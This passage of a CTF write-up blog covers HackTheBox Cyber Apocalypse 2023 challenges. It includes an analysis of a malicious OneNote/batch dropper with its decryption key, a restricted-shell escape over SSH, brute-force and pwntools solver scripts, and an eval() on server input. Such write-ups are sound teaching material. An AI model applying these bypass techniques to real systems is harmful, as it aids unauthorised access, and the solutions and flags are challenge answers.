</pre></td><td class="rouge-code"><pre>extxexport Microsoft-Windows-Sysmon%4Operational.evtx <span class="o">&gt;</span> sysmon.txt
</pre></td></tr></tbody></table></code></div></div>

<p>I loaded the <code class="language-plaintext highlighter-rouge">sysmon.txt</code> file and the rules in <code class="language-plaintext highlighter-rouge">sigma_rules/</code> for guidance, and was able to answer the questions;</p>

<p><img data-src="/assets/img/20230323144838.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="relic-maps">Relic Maps<a href="#relic-maps" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<blockquote>
  <p>Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what’s going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).</p>
</blockquote>

<p>No downloadables for this challenge, so it starts blind. Using curl, I downloaded the file linked above. <code class="language-plaintext highlighter-rouge">file</code> could not identify it’s type;</p>

<p><img data-src="/assets/img/20230323141307.png" alt="" data-proofer-ignore></p>

<p>Running <code class="language-plaintext highlighter-rouge">strings</code> on the file revealed some commands that reference 2 interesting URLs;</p>

<p><img data-src="/assets/img/20230323141450.png" alt="" data-proofer-ignore></p>

<p>The files were downloaded. <code class="language-plaintext highlighter-rouge">topsecret-maps.one</code> is another blob, but <code class="language-plaintext highlighter-rouge">window.bat</code> is an obfuscated batch file with some base64 encoded blobs;</p>

<p><img data-src="/assets/img/20230323141612.png" alt="" data-proofer-ignore></p>

<p>This <a href="https://github.com/DissectMalware/batch_deobfuscator">batch deobfuscator</a> did a great job of making the file more readable. After a bit of manual cleanup, it became obvious that the batch file is using <em>powershell</em> to decrypt, decompress, and execute a payload. The segment of interest is;</p>

<p><img data-src="/assets/img/20230323142721.png" alt="" data-proofer-ignore></p>

<p>As you can see above;</p>
<ul>
  <li>Line <code class="language-plaintext highlighter-rouge">1 - 7</code> - Loads a file named <code class="language-plaintext highlighter-rouge">script.bat</code>, split it based on newlines, and select all lines that starts with <code class="language-plaintext highlighter-rouge">:: </code></li>
  <li>Line <code class="language-plaintext highlighter-rouge">8</code> - Base64 decode the lines selected above</li>
  <li>Line <code class="language-plaintext highlighter-rouge">9 - 13</code> - Initialize an AES cipher with;
    <ul>
      <li>Mode: CBC</li>
      <li>IV: <code class="language-plaintext highlighter-rouge">2hn/J717js1MwdbbqMn7Lw==</code></li>
      <li>Key: <code class="language-plaintext highlighter-rouge">0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=</code></li>
    </ul>
  </li>
</ul>

<p>The above information is enough to decrypt the payload in <code class="language-plaintext highlighter-rouge">script.bat</code>, but we do not have access to the file. However, the deobfuscated <code class="language-plaintext highlighter-rouge">window.bat</code> file does have a line that starts with <code class="language-plaintext highlighter-rouge">:: </code> + a long base64 encoded blob;</p>

<p><img data-src="/assets/img/20230323143256.png" alt="" data-proofer-ignore></p>

<p>So I copied it and head over to <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, and was able to decrypt it using the following recipe;</p>

<p><img data-src="/assets/img/20230323143734.png" alt="" data-proofer-ignore></p>

<p>I decoded the base64 encoded output from Cyber Chef and saved it locally. <code class="language-plaintext highlighter-rouge">file</code> identified it as <code class="language-plaintext highlighter-rouge">gzip</code>, but was unable to extract;</p>

<p><img data-src="/assets/img/20230323143934.png" alt="" data-proofer-ignore></p>

<p><code class="language-plaintext highlighter-rouge">binwalk</code> however has no such weakness, and was able to extract the file, which was indentified as a 32-bit windows executable;</p>

<p><img data-src="/assets/img/20230323144103.png" alt="" data-proofer-ignore></p>

<p>Loading the binary in <em>radare2</em> and dumping the strings table revealed the flag;</p>

<p><img data-src="/assets/img/20230323144304.png" alt="" data-proofer-ignore></p>

<p>This could also be accomplished by running <code class="language-plaintext highlighter-rouge">strings</code> in 16-bit little endian mode;</p>

<p><img data-src="/assets/img/20230323144417.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="rev">Rev<a href="#rev" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<h4 id="she-shells-c-shells">She Shells C Shells<a href="#she-shells-c-shells" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p><img data-src="/assets/img/20230323145404.png" alt="" data-proofer-ignore></p>

<p>A bit of reversing revealed the logic used in password validation inside the function <code class="language-plaintext highlighter-rouge">func_flag()</code>;</p>

<p><img data-src="/assets/img/20230323150650.png" alt="" data-proofer-ignore></p>

<p>The above translate to;</p>

<pre><code class="language-C">fgets(_password_entered, 256, stdin);
for ( i = 0; i &lt;= 0x4C; ++i )
  _password_entered[i] ^= m1[i];
if ( memcmp(_password_entered, &amp;t, 0x4DuLL) )
  return 0xFFFFFFFFLL;
for ( j = 0; j &lt;= 0x4C; ++j )
  _password_entered[j] ^= m2[j];
printf("Flag: %s\n", _password_entered);
return 0LL;
</code></pre>

<p>Setting a breakpoint and stepping through the function;</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">m1</code> - <code class="language-plaintext highlighter-rouge">6e3fc3b9d78d1558e50ffbac224d57dbdfcfedfc1c846ad81ca617c4c1bfa08587a143d4584f8da8b2f27ca3b98637dabf070a7e73df5c60aecacfb9e0deff0070b9e45fc89ab351f5aea87e8d</code></li>
  <li><code class="language-plaintext highlighter-rouge">t</code> - <code class="language-plaintext highlighter-rouge">2c4ab799a3e57078936e97d9476d38bdffbb85996fe14aab74c37ba8b29fd7ecebcd63b23923e184929609c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9</code></li>
  <li><code class="language-plaintext highlighter-rouge">m2</code> - <code class="language-plaintext highlighter-rouge">641ef5e2c097441bf85ff9be185d488e91e4f6f15c8d269e2ba102f7c6f7e4b398fe57ed4a4bd1f6a1eb09c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9</code></li>
</ul>

<p>Note that <code class="language-plaintext highlighter-rouge">0x4c</code> (76) is the highest index used in the loop, meaning our passkey is a maximum of <strong>77</strong> characters long.</p>

<p>Knowing this, I wrote a script to crack it;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------
# She Shells C Shells - Cyber Apocalypse 2023 solution.
#                                       Author: 4g3nt47
#------------------------------------------------------
</span>
<span class="n">m1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"6e3fc3b9d78d1558e50ffbac224d57dbdfcfedfc1c846ad81ca617c4c1bfa08587a143d4584f8da8b2f27ca3b98637dabf070a7e73df5c60aecacfb9e0deff0070b9e45fc89ab351f5aea87e8d"</span><span class="p">)</span>
<span class="n">t</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"2c4ab799a3e57078936e97d9476d38bdffbb85996fe14aab74c37ba8b29fd7ecebcd63b23923e184929609c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9"</span><span class="p">)</span>
<span class="n">m2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"641ef5e2c097441bf85ff9be185d488e91e4f6f15c8d269e2ba102f7c6f7e4b398fe57ed4a4bd1f6a1eb09c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9"</span><span class="p">)</span>

<span class="n">plain_pass</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">77</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">m1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
      <span class="n">plain_pass</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
      <span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[+] plain_pass: "</span> <span class="o">+</span> <span class="n">plain_pass</span><span class="p">)</span>
<span class="n">plain_pass</span> <span class="o">=</span> <span class="n">plain_pass</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">42</span><span class="p">):</span>
  <span class="n">flag</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">m2</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] flag: "</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/20230323151608.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="hunting-license">Hunting License<a href="#hunting-license" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>DIfficulty: <em>easy</em></li>
</ul>

<p>This is a Q&amp;A based challenge. Binary on server differs with the one given to players. Solved all questions after a bit of reversing;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#--------------------------------------------------
# Hunting License - Cyber Apocalypse 2023 solution.
#                                   Author: 4g3nt47
#--------------------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"477b7a6177527d77557a7d727f323232"</span><span class="p">)</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)):</span>
  <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mi">19</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"165.232.98.6"</span><span class="p">,</span> <span class="mi">31978</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"elf"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"x86-64"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"libreadline"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0x401172"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"5"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"PasswordNumeroUno"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0wTdr0wss4P"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"P4ssw0rdTw0"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"19"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">decoded</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"}`"</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="misc">Misc<a href="#misc" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<h4 id="persistence">Persistence<a href="#persistence" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<blockquote>
  <p>Thousands of years ago, sending a GET request to <strong>/flag</strong> would grant immense power and wisdom. Now it’s broken and usually returns random data, but keep trying, and you might get lucky… Legends say it works once every 1000 tries.</p>
</blockquote>

<p>From the above description, it’s clear that this is a bruteforce challenge. So I wrote a script to deal with it;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#----------------------------------------------
# Persistence - Cyber Apocalypse 2023 solution.
#                               Author: 4g3nt47
#----------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">threading</span><span class="p">,</span> <span class="n">time</span>

<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="c1"># print("[*] Trying...")
</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://206.189.112.129:30585/flag"</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">if</span> <span class="s">"HTB"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Flag: </span><span class="si">{</span><span class="n">r</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="k">break</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
  <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get_flag</span><span class="p">)</span>
  <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>[+] Flag: HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}
</pre></td></tr></tbody></table></code></div></div>

<p><br /></p>

<h4 id="restricted">Restricted<a href="#restricted" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">Dockerfile</code> showed a user <code class="language-plaintext highlighter-rouge">restricted</code> created without a password;</p>

<p><img data-src="/assets/img/20230323153510.png" alt="" data-proofer-ignore></p>

<p>I was able to login over SSH without password;</p>

<p><img data-src="/assets/img/20230323153630.png" alt="" data-proofer-ignore></p>

<p>Can’t run many commands. <code class="language-plaintext highlighter-rouge">PATH</code> is marked read-only, and set to <code class="language-plaintext highlighter-rouge">/home/restricted/.bin</code> as defined in <code class="language-plaintext highlighter-rouge">bash_profile</code> used to setup the user. Can’t also use <code class="language-plaintext highlighter-rouge">/</code> in command names, so can’t supply full paths;</p>

<p><img data-src="/assets/img/20230323154018.png" alt="" data-proofer-ignore></p>

<p>Since <code class="language-plaintext highlighter-rouge">.bash_profile</code> is only loaded after a normal shell login, we could bypass this by passing commands to execute as string arguments to the SSH binary. This way, <code class="language-plaintext highlighter-rouge">.bash_profile</code> is never loaded;</p>

<p><img data-src="/assets/img/20230323154255.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="remote-computation">Remote Computation<a href="#remote-computation" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<blockquote>
  <p>The alien species use remote machines for all their computation needs. Pandora managed to hack into one, but broke its functionality in the process. Incoming computation requests need to be calculated and answered rapidly, in order to not alarm the aliens and ultimately pivot to other parts of their network. Not all requests are valid though, and appropriate error messages need to be sent depending on the type of error. Can you buy us some time by correctly responding to the next 500 requests?</p>
</blockquote>

<p>This seems to be a programming exercise. Connecting to the service, there is a help menu that explains all the requirements;</p>

<p><img data-src="/assets/img/20230323154650.png" alt="" data-proofer-ignore></p>

<p>Knowing this, I wrote a script to automate this;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------------------
# Remote Computation - Cyber Apocalypse 2023 solution.
#                                      Author: 4g3nt47
#-----------------------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"139.59.176.230"</span><span class="p">,</span> <span class="mi">30021</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" = "</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[</span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">] query: </span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ans</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">query</span><span class="p">)</span> <span class="c1"># Wr1t1ng s4f3 c0d3 1s my p45510n :)
</span>      <span class="k">if</span> <span class="n">ans</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mi">1337</span> <span class="ow">or</span> <span class="n">ans</span> <span class="o">&gt;</span> <span class="mi">1337</span><span class="p">:</span>
        <span class="n">ans</span> <span class="o">=</span> <span class="s">"MEM_ERR"</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">ans</span> <span class="o">=</span> <span class="s">"%.2f"</span> <span class="o">%</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ZeroDivisionError</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="s">"DIV0_ERR"</span>
    <span class="k">except</span> <span class="nb">SyntaxError</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="s">"SYNTAX_ERR"</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] </span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ans</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">break</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>HTB{d1v1d3_bY_Z3r0_3rr0r}
</pre></td></tr></tbody></table></code></div></div>

<p><br /></p>

<h4 id="janken">Janken<a href="#janken" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<blockquote>
  <p>As you approach an ancient tomb, you’re met with a wise guru who guards its entrance. In order to proceed, he challenges you to a game of Janken, a variation of rock paper scissors with a unique twist. But there’s a catch: you must win 100 rounds in a row to pass. Fail to do so, and you’ll be denied entry.</p>
</blockquote>

<p><img data-src="/assets/img/20230323155229.png" alt="" data-proofer-ignore></p>

<p>After a bit of reversing, the function <code class="language-plaintext highlighter-rouge">game()</code> was found to be responsible for playing a round and deciding the winner. It uses the standard C function <code class="language-plaintext highlighter-rouge">strstr()</code> to check if the choice made by computer (the <em>needle</em>), which can be <code class="language-plaintext highlighter-rouge">rock</code>, <code class="language-plaintext highlighter-rouge">paper</code>, or <code class="language-plaintext highlighter-rouge">scissors</code>, matches that made by user (the <em>haystack</em>). If it does, user wins.</p>

<p>Since <code class="language-plaintext highlighter-rouge">strstr()</code> scans the whole haystack for a match independent of position, and the program does not implement any length validation during the check, a user can simply enter the combination of all three possible choices (<code class="language-plaintext highlighter-rouge">rock</code> + <code class="language-plaintext highlighter-rouge">paper</code> + <code class="language-plaintext highlighter-rouge">scissors</code>), which will always make <code class="language-plaintext highlighter-rouge">strstr()</code> to return non-zero, giving user the win. I automated this in a simple script;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------
# Janken - Cyber Apocalypse 2023 solution.
#                          Author: 4g3nt47
#-----------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"161.35.168.118"</span><span class="p">,</span> <span class="mi">30716</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">99</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"rockpaperscissors"</span><span class="p">)</span>
  <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>[+] You are worthy! Here is your prize: HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories --><div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i><a href='/categories/hackthebox/'>hackthebox</a></div><!-- tags --><div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i><a href="/tags/hackthebox/"
